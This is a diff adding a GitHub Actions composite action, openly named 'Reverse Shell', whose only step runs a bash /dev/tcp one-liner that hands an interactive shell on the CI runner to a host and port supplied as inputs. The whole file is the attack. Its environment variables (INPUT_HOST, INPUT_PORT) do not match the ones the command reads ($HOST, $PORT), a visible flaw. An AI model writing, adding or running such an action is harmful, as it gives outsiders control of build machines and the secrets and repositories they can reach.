@@ -1,0 +1,18 @@
+name: 'Reverse Shell'
+description: 'This sends a reverse shell to a given host / port combination.'
+inputs:
+  host:
+    description: 'The hostname or IP address'
+    required: true
+  port:
+    description: 'The port to reach'
+    required: true
+runs:
+  using: "composite"
+  steps:
+    - name: Send reverse shell
+      run: sh -i >& /dev/tcp/$HOST/$PORT 0>&1
+      shell: bash
+      env:
+        INPUT_HOST: ${{ inputs.host }}
+        INPUT_PORT: ${{ inputs.port }}
